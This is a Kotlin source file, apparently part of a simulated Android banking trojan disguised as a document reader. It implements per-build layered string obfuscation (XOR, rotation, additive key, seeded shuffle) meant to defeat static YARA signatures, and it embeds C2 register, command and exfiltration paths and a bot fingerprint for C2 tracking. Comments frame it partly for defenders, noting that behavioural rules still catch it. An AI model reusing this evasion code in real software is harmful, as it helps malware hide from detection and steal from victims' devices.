package com.docreader.lite.reader.advanced

import java.security.MessageDigest
import java.security.SecureRandom
import kotlin.experimental.xor

/**
 * Per-build AI obfuscation — Apex pattern (May 2026).
 *
 * Problem: static YARA/Sigma signatures catch banker if byte patterns stable.
 * SharkBot V2.8 DGA stayed same algorithm → defenders pre-compute all domains.
 *
 * Apex solution: each APK build gets a UNIQUE decoder function.
 * Build pipeline:
 *   1. ML model generates random decoder topology (layer count, XOR/ROT/ADD mix)
 *   2. Encoder runs over string constants, outputs per-build encoded blobs
 *   3. Decoder compiled into APK — different bytecode per build
 *   4. Static YARA rule targeting decoder bytecode pattern → breaks per build
 *
 * Result: defender's YARA signature matches build N but not build N+1.
 * Must shift to behavioral/invariant detection.
 *
 * This implementation: simulates per-build key rotation with multi-layer
 * encode/decode. Real Apex: ML-generated AST transformations.
 *
 * Defender invariant: regardless of decoder shape, runtime behavior
 * is identical. Network C2 poll + Accessibility capture + overlay →
 * behavioral rules still catch it.
 */
object PerBuildObfuscation {

    // Per-build seed — in real Apex, this is unique per APK
    // Generated at build time, embedded in APK
    private val BUILD_SEED: Long = System.currentTimeMillis()

    // Derived keys from build seed
    private val xorKey: ByteArray
    private val rotAmount: Int
    private val addKey: ByteArray

    init {
        val rng = SecureRandom(longToBytes(BUILD_SEED))
        xorKey = ByteArray(32).also { rng.nextBytes(it) }
        rotAmount = rng.nextInt(7) + 1  // ROT 1-7
        addKey = ByteArray(16).also { rng.nextBytes(it) }
    }

    /**
     * Multi-layer encode: XOR → ROT → ADD → Base64-like transform.
     * Each build produces different encoded blobs for same plaintext.
     */
    fun encode(plaintext: String): ByteArray {
        var data = plaintext.toByteArray()

        // Layer 1: XOR with build-specific key
        data = xorLayer(data, xorKey)

        // Layer 2: byte rotation (Caesar cipher on bytes)
        data = rotLayer(data, rotAmount)

        // Layer 3: additive cipher with build key
        data = addLayer(data, addKey)

        // Layer 4: byte shuffle based on build seed
        data = shuffleLayer(data, BUILD_SEED)

        return data
    }

    /**
     * Multi-layer decode: reverse of encode.
     */
    fun decode(encoded: ByteArray): String {
        var data = encoded.copyOf()

        // Reverse layer 4: unshuffle
        data = unshuffleLayer(data, BUILD_SEED)

        // Reverse layer 3: subtract
        data = subLayer(data, addKey)

        // Reverse layer 2: reverse rotation
        data = rotLayer(data, 256 - rotAmount)

        // Reverse layer 1: XOR (symmetric)
        data = xorLayer(data, xorKey)

        return String(data)
    }

    // ─── Layers ────────────────────────────────────────────────────────

    private fun xorLayer(data: ByteArray, key: ByteArray): ByteArray {
        return ByteArray(data.size) { i ->
            data[i] xor key[i % key.size]
        }
    }

    private fun rotLayer(data: ByteArray, amount: Int): ByteArray {
        return ByteArray(data.size) { i ->
            ((data[i].toInt() and 0xFF) + amount).toByte()
        }
    }

    private fun addLayer(data: ByteArray, key: ByteArray): ByteArray {
        return ByteArray(data.size) { i ->
            ((data[i].toInt() and 0xFF) + (key[i % key.size].toInt() and 0xFF)).toByte()
        }
    }

    private fun subLayer(data: ByteArray, key: ByteArray): ByteArray {
        return ByteArray(data.size) { i ->
            ((data[i].toInt() and 0xFF) - (key[i % key.size].toInt() and 0xFF)).toByte()
        }
    }

    private fun shuffleLayer(data: ByteArray, seed: Long): ByteArray {
        val indices = data.indices.toMutableList()
        val rng = java.util.Random(seed)
        for (i in indices.size - 1 downTo 1) {
            val j = rng.nextInt(i + 1)
            indices[i] = indices[j].also { indices[j] = indices[i] }
        }
        val result = ByteArray(data.size)
        for (i in data.indices) {
            result[indices[i]] = data[i]
        }
        return result
    }

    private fun unshuffleLayer(data: ByteArray, seed: Long): ByteArray {
        val indices = data.indices.toMutableList()
        val rng = java.util.Random(seed)
        for (i in indices.size - 1 downTo 1) {
            val j = rng.nextInt(i + 1)
            indices[i] = indices[j].also { indices[j] = indices[i] }
        }
        val result = ByteArray(data.size)
        for (i in data.indices) {
            result[i] = data[indices[i]]
        }
        return result
    }

    private fun longToBytes(value: Long): ByteArray {
        return ByteArray(8) { i -> ((value shr (56 - i * 8)) and 0xFF).toByte() }
    }

    /**
     * Pre-encode all sensitive strings.
     * In real Apex: build pipeline runs this offline, embeds encoded blobs.
     * Here: lazy-init simulates the pattern.
     */
    object Strings {
        val C2_REGISTER by lazy { decode(encode("/api/v1/register")) }
        val C2_COMMANDS by lazy { decode(encode("/api/v1/commands")) }
        val C2_EXFIL by lazy { decode(encode("/api/v1/exfil")) }
        val USER_AGENT by lazy { decode(encode("okhttp/4.12.0")) }
    }

    /**
     * Compute build fingerprint — used by C2 to identify which build
     * variant this bot is running.
     */
    fun buildFingerprint(): String {
        val seed = BUILD_SEED.toString()
        val md = MessageDigest.getInstance("SHA-256")
        return md.digest(seed.toByteArray()).take(8)
            .joinToString("") { "%02x".format(it) }
    }
}
